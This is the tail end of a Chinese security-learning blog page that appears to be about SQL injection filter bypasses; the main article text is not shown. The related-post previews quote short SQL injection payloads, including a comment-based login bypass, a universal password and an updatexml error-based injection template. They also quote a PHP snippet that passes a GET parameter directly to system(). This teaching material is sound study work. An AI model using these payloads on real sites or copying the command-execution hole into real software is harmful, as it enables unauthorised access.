class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">命令执行函数</div></div><div class="info-2"><div class="info-item-1">常见函数12system exec passthru shell_exec 反引号 popen proc_open pcntl_exec  注意点：  如何运行 运行条件 参数 是否有回显  systemsystem(string $command,int &amp;return_var=?) 作用 参数: command：执行command参数所制定的命令，并且输出执行结果 return_var:如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中 有回显     参数 ———&gt; 回显     提交命令  返回结果     举例 123&lt;?php$cmd = $_GET[&#x27;cmd&#x27;];system($cmd);  // 直接执行并输出，如?cmd=ls execexec(string $command,array...</div></div></div></a><a class="pagination-related" href="/posts/99eb0d83.html" title="SQL注入之POST提交注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL注入之POST提交注入</div></div><div class="info-2"><div class="info-item-1">POST提交和GET提交的区别    POST提交 GET提交     不可缓存 可缓存   不可保留在浏览记录 可保留在浏览记录   不可收藏为书签 可收藏为书签   没有长度限制 有长度限制（最长2048个字符）     POST注入原理核心漏洞原因用户输入未过滤：后端直接将用户通过 POST 提交的参数拼接到 SQL 语句中。 举例 1234567#原始SQLSELECT * FROM users WHERE username=&#x27;$_POST[username]&#x27; AND password=&#x27;$_POST[password]&#x27;#攻击输入admin&#x27; -- +&amp;&amp;password=123(任意值)#此时系统的查询语句SELECT * FROM users WHERE username=&#x27;admin&#x27; -- &#x27; AND password=&#x27;123&#x27;#注释符 -- 使密码条件失效，直接以 admin...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/99eb0d83.html" title="SQL注入之POST提交注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-08</div><div class="info-item-2">SQL注入之POST提交注入</div></div><div class="info-2"><div class="info-item-1">POST提交和GET提交的区别    POST提交 GET提交     不可缓存 可缓存   不可保留在浏览记录 可保留在浏览记录   不可收藏为书签 可收藏为书签   没有长度限制 有长度限制（最长2048个字符）     POST注入原理核心漏洞原因用户输入未过滤：后端直接将用户通过 POST 提交的参数拼接到 SQL 语句中。 举例 1234567#原始SQLSELECT * FROM users WHERE username=&#x27;$_POST[username]&#x27; AND password=&#x27;$_POST[password]&#x27;#攻击输入admin&#x27; -- +&amp;&amp;password=123(任意值)#此时系统的查询语句SELECT * FROM users WHERE username=&#x27;admin&#x27; -- &#x27; AND password=&#x27;123&#x27;#注释符 -- 使密码条件失效，直接以 admin...</div></div></div></a><a class="pagination-related" href="/posts/bf58a956.html" title="SQL报错注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164405.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">SQL报错注入</div></div><div class="info-2"><div class="info-item-1">SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：  extractvalue() updatexml() floor(rand()\*2)   盲注： 布尔盲注 时间盲注   报错注入（Error-Based Injection）核心原理 适用条件：页面无数据回显，但能返回数据库错误信息。 原理：利用数据库函数执行时的参数校验漏洞，将查询结果嵌入到错误信息中。  updatexml() 函数报错注入原理 函数作用：修改 XML 文档的指定节点内容。  语法 1updatexml(XML_document, XPath_string, new_value)  触发错误条件：当 XPath_string 参数格式非法时（如包含特殊字符 ~），函数抛出错误，并将错误信息包含非法内容。   Payload 构造1and updatexml(1, concat(0x7e, (查询语句), 0x7e), 1)  关键点  0x7e 是 ~ 的十六进制，用于分隔错误信息中的目标数据。   将查询结果拼接到第二个参数中，触发 XPath...</div></div></div></a><a class="pagination-related no-desc" href="/posts/4d669f08.html" title="SQL注入之一句话木马"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img00eb9d9de849c996d4cdb440fb732bdb395143382.jpg@1192w.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="info-item-2">SQL注入之一句话木马</div></div></div></a><a class="pagination-related" href="/posts/f829d9e.html" title="SQL注入其他问题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164357.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">SQL注入其他问题</div></div><div class="info-2"><div class="info-item-1">id=-1 和id= 1 的区别两种场景的本质区别     场景 id=-1 + UNION id=1 + ORDER BY     目标 显示 UNION 后的自定义数据 探测原查询的列数   原查询是否需要结果 不需要（需返回空） 需要（确保 ORDER BY 能执行）   核心逻辑 绕过原数据，强制显示注入结果 利用错误或页面变化推断列数   数值选择 用不存在的值（如 -1） 用存在的值（如 1）     SQL注入语句注释在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是#和— (—后面有空格) 但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 get 传参时不包括#，因为使用 # 闭合无法注释，会报错；而使用— （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 —+ 的方式来闭合，因为+会被解释成空格。 注释符号的差异与使用场景(1) #...</div></div></div></a><a class="pagination-related" href="/posts/9ba791c1.html" title="SQL注入原理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164222.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-25</div><div class="info-item-2">SQL注入原理</div></div><div class="info-2"><div class="info-item-1">SQL注入概念及产生原因：​    当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 2.SQL注入的本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 3.SQL注入的两个关键点：1，用户能控制输入的内容； 2，web应用把用户输入的内容带入到数据库执行；SQL注入基础危害：）盗取网站的敏感信息;）绕过网站后台认证 后台登录语句： SELECT * FROM admin WHERE Username=‘user’ and Password=‘pass’ 万能密码：‘or ’1‘ = ’1‘ # ;）借助SQL注入漏洞提权获取系统权限;）读取文件信息。MYSQL数据库注入-常用函数：（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 （2）version() 返回当前数据库的版本 （3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到...</div></div></div></a><a class="pagination-related" href="/posts/9b13a55.html" title="SQL注入总结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164214.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">SQL注入总结</div></div><div class="info-2"><div class="info-item-1">SQL注入原理 SQL注入思路 如何判断SQL注入闭合 SQL注入方式：  联合查询 报错注入 布尔盲注  其他问题： SQL注入语句闭合方式 </div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">FLYFISH</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FLYFISH567"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">三玖天下第一！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">过滤注释符绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E9%A1%B5%E9%9D%A2%E8%BF%87%E6%BB%A4%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.</span> <span class="toc-text">如何判断页面过滤对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%96%E7%95%A5"><span class="toc-number">1.2.</span> <span class="toc-text">策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4AND-OR%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">过滤AND OR绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="toc-number">2.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">空格过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-2"><span class="toc-number">3.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">逗号过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-3"><span class="toc-number">4.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select%E3%80%81union%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">select、union过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-4"><span class="toc-number">5.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">宽字节注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">6.1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97%E5%87%BD%E6%95%B0"><span class="toc-number">6.2.</span> <span class="toc-text">对抗函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GBK%E7%BC%96%E7%A0%81"><span class="toc-number">6.3.</span> <span class="toc-text">GBK编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="toc-number">6.4.</span> <span class="toc-text">绕过原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-5"><span class="toc-number">6.5.</span> <span class="toc-text">绕过方法</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/b446c001.html" title="PHP命令执行靶场搭建"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164222.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP命令执行靶场搭建"/></a><div class="content"><a class="title" href="/posts/b446c001.html" title="PHP命令执行靶场搭建">PHP命令执行靶场搭建</a><time datetime="2025-03-09T10:36:35.045Z" title="发表于 2025-03-09 18:36:35">2025-03-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/99eb0d83.html" title="SQL注入之POST提交注入"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入之POST提交注入"/></a><div class="content"><a class="title" href="/posts/99eb0d83.html" title="SQL注入之POST提交注入">SQL注入之POST提交注入</a><time datetime="2025-03-08T07:42:19.077Z" title="发表于 2025-03-08 15:42:19">2025-03-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a7642d18.html" title="SQL注入过滤绕过"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164205.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入过滤绕过"/></a><div class="content"><a class="title" href="/posts/a7642d18.html" title="SQL注入过滤绕过">SQL注入过滤绕过</a><time datetime="2025-03-08T07:41:57.005Z" title="发表于 2025-03-08 15:41:57">2025-03-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fe305eff.html" title="命令执行函数"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img373f68957c1a6b90f5f394cf59c2dfed395143382.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行函数"/></a><div class="content"><a class="title" href="/posts/fe305eff.html" title="命令执行函数">命令执行函数</a><time datetime="2025-03-04T09:58:13.234Z" title="发表于 2025-03-04 17:58:13">2025-03-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/179744d1.html" title="SQL盲注"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164357.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL盲注"/></a><div class="content"><a class="title" href="/posts/179744d1.html" title="SQL盲注">SQL盲注</a><time datetime="2025-03-03T04:05:27.586Z" title="发表于 2025-03-03 12:05:27">2025-03-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 By FLYFISH</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="12908278323" data-server="netease" data-type="playlist"   data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true" ></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      window.location.href = e.request.responseURL
+    }
+  })
+})()</script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="输入关键词搜索..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = '5429a99f23174127af22bfe2cc7a43df';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.6534116,27.96920845';
+  var clock_default_rectangle_enable = 'true';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu@1.1.6/lib/clock.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="/js/ali_font.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
